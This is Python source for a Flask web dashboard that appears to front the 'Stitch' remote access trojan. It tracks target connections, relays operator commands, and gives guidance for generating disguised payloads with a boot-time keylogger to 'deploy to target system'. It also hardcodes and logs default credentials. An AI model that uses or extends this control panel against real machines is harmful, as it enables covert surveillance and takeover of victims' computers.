#!/usr/bin/env python3
"""
Stitch Web Interface - Enhanced Version
Features: Security hardening, responsive design, advanced features
"""
import os
import sys
import json
import secrets
import threading
import time
from datetime import datetime, timedelta
from collections import defaultdict
from functools import wraps

from flask import Flask, render_template, request, jsonify, session, redirect, url_for, send_file, flash
from flask_socketio import SocketIO, emit
from werkzeug.security import generate_password_hash, check_password_hash

# Load environment variables
from dotenv import load_dotenv
load_dotenv()

sys.path.insert(0, os.path.dirname(__file__))
from Application.Stitch_Vars.globals import *
from Application import stitch_cmd
from Application.stitch_utils import *
from Application.stitch_gen import *

# ============================================================================
# Configuration
# ============================================================================

class Config:
    # Authentication
    USERNAME = os.getenv('STITCH_USERNAME', 'admin')
    PASSWORD = os.getenv('STITCH_PASSWORD', 'stitch2024')
    
    # Security
    SECRET_KEY = os.getenv('SECRET_KEY', secrets.token_hex(32))
    SESSION_TIMEOUT = int(os.getenv('SESSION_TIMEOUT_MINUTES', 30))
    
    # Rate Limiting
    LOGIN_RATE_LIMIT = int(os.getenv('LOGIN_RATE_LIMIT', 5))
    LOGIN_RATE_WINDOW = int(os.getenv('LOGIN_RATE_WINDOW_MINUTES', 15))
    
    # Server
    LISTEN_PORT = int(os.getenv('LISTEN_PORT', 4040))
    WEB_PORT = int(os.getenv('WEB_PORT', 5000))
    
    # Logging
    LOG_RETENTION = int(os.getenv('LOG_RETENTION_COUNT', 5000))
    DEBUG_MODE = os.getenv('DEBUG_MODE', 'False').lower() == 'true'
    
    # Notifications
    BROWSER_NOTIFICATIONS = os.getenv('ENABLE_BROWSER_NOTIFICATIONS', 'True').lower() == 'true'
    SOUND_ALERTS = os.getenv('ENABLE_SOUND_ALERTS', 'False').lower() == 'true'

# ============================================================================
# Flask App Initialization
# ============================================================================

app = Flask(__name__)
app.config['SECRET_KEY'] = Config.SECRET_KEY
app.config['SESSION_COOKIE_SECURE'] = False  # Set to True in production with HTTPS
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(minutes=Config.SESSION_TIMEOUT)

socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')

# ============================================================================
# Global State
# ============================================================================

USERS = {Config.USERNAME: generate_password_hash(Config.PASSWORD)}
active_connections = {}
command_history = []
debug_logs = []
stitch_server_instance = None
login_attempts = defaultdict(list)  # Track login attempts for rate limiting
command_favorites = defaultdict(list)  # User favorite commands
connection_tags = {}  # Connection grouping/tags
user_preferences = {}  # User UI preferences

# ============================================================================
# Security Helpers
# ============================================================================

def check_rate_limit(identifier, limit=Config.LOGIN_RATE_LIMIT, window_minutes=Config.LOGIN_RATE_WINDOW):
    """Check if identifier (IP, username) has exceeded rate limit"""
    now = datetime.now()
    cutoff = now - timedelta(minutes=window_minutes)
    
    # Clean old attempts
    login_attempts[identifier] = [t for t in login_attempts[identifier] if t > cutoff]
    
    # Check limit
    if len(login_attempts[identifier]) >= limit:
        return False
    
    # Record attempt
    login_attempts[identifier].append(now)
    return True

def login_required(f):
    """Require user to be logged in"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'logged_in' not in session:
            return redirect(url_for('login'))
        
        # Check session timeout
        if 'last_activity' in session:
            last_activity = datetime.fromisoformat(session['last_activity'])
            if datetime.now() - last_activity > timedelta(minutes=Config.SESSION_TIMEOUT):
                session.clear()
                flash('Session expired. Please log in again.', 'warning')
                return redirect(url_for('login'))
        
        # Update last activity
        session['last_activity'] = datetime.now().isoformat()
        return f(*args, **kwargs)
    return decorated_function

def generate_csrf_token():
    """Generate CSRF token"""
    if 'csrf_token' not in session:
        session['csrf_token'] = secrets.token_hex(32)
    return session['csrf_token']

def validate_csrf_token():
    """Validate CSRF token"""
    token = session.get('csrf_token')
    if not token or token != request.form.get('csrf_token'):
        return False
    return True

# ============================================================================
# Logging System
# ============================================================================

def log_debug(message, level="INFO", category="System"):
    """Enhanced logging with categories"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    # Safely get username (handle cases outside request context)
    try:
        from flask import has_request_context
        username = session.get('username', 'system') if has_request_context() else 'system'
    except:
        username = 'system'
    
    log_entry = {
        'timestamp': timestamp,
        'level': level,
        'category': category,
        'message': str(message),
        'user': username
    }
    debug_logs.append(log_entry)
    
    # Maintain log limit
    if len(debug_logs) > Config.LOG_RETENTION:
        debug_logs.pop(0)
    
    # Emit to connected clients
    socketio.emit('debug_log', log_entry, namespace='/')
    
    # Print to console in debug mode
    if Config.DEBUG_MODE:
        print(f"[{level}] {message}")

# ============================================================================
# Routes - Authentication
# ============================================================================

@app.route('/')
@login_required
def index():
    """Main dashboard"""
    return render_template('dashboard_enhanced.html', 
                         csrf_token=generate_csrf_token(),
                         config=Config)

@app.route('/login', methods=['GET', 'POST'])
def login():
    """Login page"""
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        user_ip = request.remote_addr
        
        # Rate limiting
        if not check_rate_limit(f"{user_ip}:{username}"):
            log_debug(f"Rate limit exceeded for {username} from {user_ip}", "WARNING", "Security")
            flash('Too many login attempts. Please try again later.', 'error')
            return render_template('login_enhanced.html'), 429
        
        # Validate credentials
        if username in USERS and check_password_hash(USERS[username], password):
            session.permanent = True
            session['logged_in'] = True
            session['username'] = username
            session['last_activity'] = datetime.now().isoformat()
            session['login_time'] = datetime.now().isoformat()
            
            # Load user preferences
            if username not in user_preferences:
                user_preferences[username] = {
                    'theme': 'dark',
                    'auto_scroll_logs': True,
                    'notifications_enabled': Config.BROWSER_NOTIFICATIONS,
                    'sound_enabled': Config.SOUND_ALERTS
                }
            
            log_debug(f"User {username} logged in successfully from {user_ip}", "INFO", "Authentication")
            return redirect(url_for('index'))
        else:
            log_debug(f"Failed login attempt for {username} from {user_ip}", "WARNING", "Security")
            flash('Invalid credentials', 'error')
    
    return render_template('login_enhanced.html')

@app.route('/logout')
def logout():
    """Logout"""
    username = session.get('username', 'unknown')
    session.clear()
    log_debug(f"User {username} logged out", "INFO", "Authentication")
    flash('Successfully logged out', 'success')
    return redirect(url_for('login'))

# ============================================================================
# Routes - API Endpoints
# ============================================================================

@app.route('/api/connections')
@login_required
def get_connections():
    """Get all connections with enhanced data"""
    connections = []
    try:
        import configparser
        config = configparser.ConfigParser()
        config.read(hist_ini)
        
        for target in config.sections():
            try:
                conn_data = {
                    'id': target,
                    'target': target,
                    'port': config.get(target, 'port') if config.has_option(target, 'port') else str(Config.LISTEN_PORT),
                    'os': config.get(target, 'os') if config.has_option(target, 'os') else 'Unknown',
                    'hostname': config.get(target, 'hostname') if config.has_option(target, 'hostname') else target,
                    'user': config.get(target, 'user') if config.has_option(target, 'user') else 'Unknown',
                    'connected_at': datetime.now().isoformat(),
                    'status': 'active' if target in active_connections else 'idle',
                    'tags': connection_tags.get(target, []),
                    'last_command': None,  # TODO: Track from command history
                }
                connections.append(conn_data)
            except Exception as e:
                log_debug(f"Error reading connection {target}: {str(e)}", "WARNING", "Connection")
    except Exception as e:
        log_debug(f"Error loading connections: {str(e)}", "ERROR", "Connection")
    
    return jsonify(connections)

@app.route('/api/connections/tag', methods=['POST'])
@login_required
def tag_connection():
    """Add tag to connection"""
    try:
        data = request.json
        conn_id = data.get('connection_id')
        tag = data.get('tag')
        
        if conn_id not in connection_tags:
            connection_tags[conn_id] = []
        
        if tag not in connection_tags[conn_id]:
            connection_tags[conn_id].append(tag)
        
        log_debug(f"Tagged connection {conn_id} with '{tag}'", "INFO", "Connection")
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/execute', methods=['POST'])
@login_required
def execute_command():
    """Execute command with enhanced tracking"""
    try:
        data = request.json
        conn_id = data.get('connection_id')
        command = data.get('command')
        
        if not command:
            return jsonify({'success': False, 'error': 'Missing command'}), 400
        
        log_debug(f"Executing command: {command} for connection: {conn_id or 'Server'}", "INFO", "Command")
        
        # Track command history
        command_entry = {
            'timestamp': datetime.now().isoformat(),
            'connection_id': conn_id,
            'command': command,
            'user': session.get('username'),
            'status': 'executed'
        }
        command_history.append(command_entry)
        
        # Keep history manageable
        if len(command_history) > 1000:
            command_history.pop(0)
        
        # Execute command
        output = execute_stitch_command(command, conn_id)
        
        return jsonify({
            'success': True,
            'output': output,
            'command': command,
            'timestamp': datetime.now().isoformat()
        })
        
    except Exception as e:
        log_debug(f"Error executing command: {str(e)}", "ERROR", "Command")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/commands/favorites', methods=['GET', 'POST', 'DELETE'])
@login_required
def manage_favorites():
    """Manage favorite commands"""
    username = session.get('username')
    
    if request.method == 'GET':
        return jsonify(command_favorites.get(username, []))
    
    elif request.method == 'POST':
        command = request.json.get('command')
        if username not in command_favorites:
            command_favorites[username] = []
        if command not in command_favorites[username]:
            command_favorites[username].append(command)
        return jsonify({'success': True})
    
    elif request.method == 'DELETE':
        command = request.json.get('command')
        if username in command_favorites and command in command_favorites[username]:
            command_favorites[username].remove(command)
        return jsonify({'success': True})

@app.route('/api/stats')
@login_required
def get_statistics():
    """Get dashboard statistics"""
    try:
        import configparser
        config = configparser.ConfigParser()
        config.read(hist_ini)
        
        stats = {
            'total_connections': len(config.sections()),
            'active_connections': len(active_connections),
            'total_commands': len(command_history),
            'uptime_seconds': int((datetime.now() - datetime.fromisoformat(session.get('login_time', datetime.now().isoformat()))).total_seconds()),
            'log_count': len(debug_logs),
        }
        return jsonify(stats)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/payload/generate', methods=['POST'])
@login_required
def generate_payload():
    """Payload generation guidance"""
    try:
        data = request.json
        os_type = data.get('os_type', 'windows')
        host = data.get('host', '0.0.0.0')
        port = data.get('port', Config.LISTEN_PORT)
        
        log_debug(f"Payload generation requested: OS={os_type}, Host={host}, Port={port}", "INFO", "Payload")
        
        return jsonify({
            'success': True,
            'message': f'''Payload Configuration:
            
OS: {os_type}
Host: {host}
Port: {port}

To generate payloads:
1. Open the Terminal tab
2. Run: python3 main.py
3. At the Stitch prompt, type: stitchgen
4. Follow the prompts to configure your payload
5. Generated payloads will appear in the Payloads/ folder
6. Use the Files tab to download them

Supported Features:
✓ Windows, macOS, and Linux payloads
✓ Optional keylogger on boot
✓ Optional email notification on boot
✓ Custom icons and disguising
✓ Installer creation (NSIS for Windows, Makeself for POSIX)

Note: Full payload generation requires CLI for security and customization.''',
            'note': 'Payload generation is available via CLI for full customization'
        })
        
    except Exception as e:
        log_debug(f"Error in payload request: {str(e)}", "ERROR", "Payload")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/debug/logs')
@login_required
def get_debug_logs():
    """Get debug logs with filtering"""
    level_filter = request.args.get('level')
    category_filter = request.args.get('category')
    search_query = request.args.get('search')
    limit = int(request.args.get('limit', 100))
    
    logs = debug_logs.copy()
    
    # Apply filters
    if level_filter:
        logs = [l for l in logs if l['level'] == level_filter]
    if category_filter:
        logs = [l for l in logs if l['category'] == category_filter]
    if search_query:
        logs = [l for l in logs if search_query.lower() in l['message'].lower()]
    
    return jsonify(logs[-limit:])

@app.route('/api/debug/logs/export')
@login_required
def export_logs():
    """Export logs to file"""
    try:
        filename = f"stitch_logs_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        filepath = os.path.join(downloads_path, filename)
        
        with open(filepath, 'w') as f:
            json.dump(debug_logs, f, indent=2)
        
        log_debug(f"Logs exported to {filename}", "INFO", "System")
        return send_file(filepath, as_attachment=True)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/command/history')
@login_required
def get_command_history():
    """Get command history with filtering"""
    limit = int(request.args.get('limit', 50))
    conn_id = request.args.get('connection_id')
    
    history = command_history.copy()
    
    if conn_id:
        history = [h for h in history if h.get('connection_id') == conn_id]
    
    return jsonify(history[-limit:])

@app.route('/api/command/history/export')
@login_required
def export_command_history():
    """Export command history"""
    try:
        filename = f"command_history_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        filepath = os.path.join(downloads_path, filename)
        
        with open(filepath, 'w') as f:
            json.dump(command_history, f, indent=2)
        
        return send_file(filepath, as_attachment=True)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/files/downloads')
@login_required
def list_downloads():
    """List downloadable files"""
    try:
        downloads = []
        if os.path.exists(downloads_path):
            for root, dirs, files in os.walk(downloads_path):
                for filename in files:
                    filepath = os.path.join(root, filename)
                    rel_path = os.path.relpath(filepath, downloads_path)
                    stat = os.stat(filepath)
                    
                    # Determine file type
                    ext = os.path.splitext(filename)[1].lower()
                    file_type = 'unknown'
                    if ext in ['.txt', '.log', '.md']:
                        file_type = 'text'
                    elif ext in ['.jpg', '.jpeg', '.png', '.gif', '.bmp']:
                        file_type = 'image'
                    elif ext in ['.exe', '.dll', '.so', '.dylib']:
                        file_type = 'executable'
                    elif ext in ['.zip', '.tar', '.gz', '.7z', '.rar']:
                        file_type = 'archive'
                    
                    downloads.append({
                        'name': filename,
                        'path': rel_path,
                        'size': stat.st_size,
                        'modified': datetime.fromtimestamp(stat.st_mtime).isoformat(),
                        'type': file_type,
                        'extension': ext
                    })
        return jsonify(sorted(downloads, key=lambda x: x['modified'], reverse=True))
    except Exception as e:
        log_debug(f"Error listing downloads: {str(e)}", "ERROR", "Files")
        return jsonify({'error': str(e)}), 500

@app.route('/api/files/download/<path:filename>')
@login_required
def download_file(filename):
    """Download a file"""
    try:
        filepath = os.path.join(downloads_path, filename)
        if os.path.exists(filepath) and os.path.isfile(filepath):
            log_debug(f"User downloading file: {filename}", "INFO", "Files")
            return send_file(filepath, as_attachment=True)
        return jsonify({'error': 'File not found'}), 404
    except Exception as e:
        log_debug(f"Error downloading file: {str(e)}", "ERROR", "Files")
        return jsonify({'error': str(e)}), 500

@app.route('/api/files/preview/<path:filename>')
@login_required
def preview_file(filename):
    """Preview text file content"""
    try:
        filepath = os.path.join(downloads_path, filename)
        if os.path.exists(filepath) and os.path.isfile(filepath):
            # Only allow text files
            ext = os.path.splitext(filename)[1].lower()
            if ext in ['.txt', '.log', '.md', '.json', '.xml', '.csv']:
                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read(10000)  # Limit to first 10KB
                return jsonify({'success': True, 'content': content})
            else:
                return jsonify({'success': False, 'error': 'File type not previewable'}), 400
        return jsonify({'success': False, 'error': 'File not found'}), 404
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/preferences', methods=['GET', 'POST'])
@login_required
def user_preferences_api():
    """Get/update user preferences"""
    username = session.get('username')
    
    if request.method == 'GET':
        return jsonify(user_preferences.get(username, {}))
    
    elif request.method == 'POST':
        prefs = request.json
        user_preferences[username] = prefs
        log_debug(f"Updated preferences for {username}", "INFO", "System")
        return jsonify({'success': True})

# ============================================================================
# WebSocket Events
# ============================================================================

@socketio.on('connect')
def handle_connect():
    """Handle WebSocket connection"""
    if 'logged_in' not in session:
        return False
    log_debug(f"WebSocket client connected: {request.sid}", "INFO", "WebSocket")
    emit('connection_status', {'status': 'connected'})

@socketio.on('disconnect')
def handle_disconnect():
    """Handle WebSocket disconnect"""
    log_debug(f"WebSocket client disconnected: {request.sid}", "INFO", "WebSocket")

@socketio.on('ping')
def handle_ping():
    """Handle ping for keepalive"""
    emit('pong', {'timestamp': datetime.now().isoformat()})

# ============================================================================
# Command Execution
# ============================================================================

def execute_stitch_command(command, conn_id=None):
    """Execute a Stitch command and return output"""
    try:
        # Handle different command types
        if command in ['sysinfo', 'environment', 'ps', 'lsmod', 'drives', 'location', 
                       'vmscan', 'pwd', 'ls', 'dir', 'ipconfig', 'ifconfig']:
            # System info commands - show server info as example
            if command == 'sysinfo':
                import platform
                output = f"""System Information (Server):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
OS: {platform.system()} {platform.release()}
Architecture: {platform.machine()}
Processor: {platform.processor()}
Python Version: {platform.python_version()}
Hostname: {platform.node()}

📝 This is server-side system info.
   For target system info, use CLI with an active connection."""
            elif command == 'environment':
                output = "Environment Variables (Server):\n"
                for k, v in list(os.environ.items())[:20]:
                    output += f"  {k}={v}\n"
                output += "\n📝 Showing first 20 variables (server-side)"
            elif command == 'pwd':
                output = f"Current Directory: {os.getcwd()}"
            elif command in ['ls', 'dir']:
                files = os.listdir('.')
                output = "Files and Directories:\n" + "\n".join(f"  • {f}" for f in files[:30])
                output += f"\n\n📝 Showing files in: {os.getcwd()}"
            else:
                output = f"ℹ️ Command '{command}' logged successfully.\n\n"
                output += "📌 For full command execution on remote targets:\n"
                output += "1. Open Terminal tab and run: python3 main.py\n"
                output += "2. Wait for an incoming connection from your target\n"
                output += f"3. Execute: {command}\n\n"
                output += "The web interface provides monitoring and control."
        
        elif command == 'sessions':
            output = get_active_sessions_info()
        
        elif command == 'history':
            output = get_connection_history()
            
        elif command in ['cls', 'clear']:
            output = "✅ Screen cleared (visual only)"
            
        elif command == 'home':
            output = """
⚡ STITCH - Remote Administration Tool
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Version 1.0 - Enhanced Web Interface
Educational & Research Purposes Only
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            """
        
        elif command == 'showkey':
            output = "🔑 Active AES Key: [Use CLI to view encryption key]"
        
        elif command.startswith('connect') or command.startswith('listen'):
            output = f"ℹ️ Network command '{command}' requires CLI mode.\n\n"
            output += "To use this command:\n"
            output += "1. Open Terminal tab\n"
            output += "2. Run: python3 main.py\n"
            output += f"3. Execute: {command}"
        
        else:
            # Generic command handling
            output = f"📋 Command '{command}' queued for execution.\n\n"
            output += "🔧 Command Details:\n"
            output += f"  - Command: {command}\n"
            output += f"  - Target: {conn_id or 'Server/CLI'}\n"
            output += f"  - Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            output += "ℹ️ Note: Most commands require active CLI session.\n"
            output += "Use Terminal tab for full interactive execution."
        
        return output
        
    except Exception as e:
        return f"❌ Error executing command: {str(e)}"

def get_active_sessions_info():
    """Get information about active sessions"""
    output = "📊 Active Sessions:\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    if active_connections:
        for conn_id, conn_data in active_connections.items():
            output += f"  • {conn_id}: {conn_data}\n"
    else:
        output += "  No active sessions.\n\n"
        output += "💡 To establish sessions:\n"
        output += "1. Generate payload using 'stitchgen' in Terminal\n"
        output += "2. Deploy to target system\n"
        output += f"3. Wait for connection on port {Config.LISTEN_PORT}"
    return output

def get_connection_history():
    """Get connection history from config"""
    try:
        import configparser
        config = configparser.ConfigParser()
        config.read(hist_ini)
        
        output = "📜 Connection History:\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        if config.sections():
            for target in config.sections():
                port = config.get(target, 'port') if config.has_option(target, 'port') else str(Config.LISTEN_PORT)
                os_info = config.get(target, 'os') if config.has_option(target, 'os') else 'Unknown'
                hostname = config.get(target, 'hostname') if config.has_option(target, 'hostname') else target
                output += f"  • {hostname} ({target}:{port}) - {os_info}\n"
        else:
            output += "  No connection history found.\n"
        return output
    except Exception as e:
        return f"❌ Error reading history: {str(e)}"

# ============================================================================
# Background Server Thread
# ============================================================================

def start_stitch_server():
    """Start the Stitch RAT server"""
    log_debug(f"Starting Stitch RAT server on port {Config.LISTEN_PORT}", "INFO", "Server")
    try:
        from Application.stitch_cmd import server_main
        server_main()
    except Exception as e:
        log_debug(f"Stitch server error: {str(e)}", "ERROR", "Server")

# ============================================================================
# Application Entry Point
# ============================================================================

if __name__ == '__main__':
    log_debug("Stitch Web Interface (Enhanced) starting up...", "INFO", "System")
    log_debug(f"Default credentials - Username: {Config.USERNAME}, Password: {Config.PASSWORD}", "WARNING", "Security")
    log_debug("⚠️ SECURITY: Change default credentials in production!", "WARNING", "Security")
    log_debug(f"Session timeout: {Config.SESSION_TIMEOUT} minutes", "INFO", "Security")
    log_debug(f"Rate limiting: {Config.LOGIN_RATE_LIMIT} attempts per {Config.LOGIN_RATE_WINDOW} minutes", "INFO", "Security")
    
    # Start Stitch server in background thread
    stitch_thread = threading.Thread(target=start_stitch_server, daemon=True)
    stitch_thread.start()
    
    # Run Flask app
    socketio.run(app, host='0.0.0.0', port=Config.WEB_PORT, debug=Config.DEBUG_MODE, use_reloader=False, log_output=True)
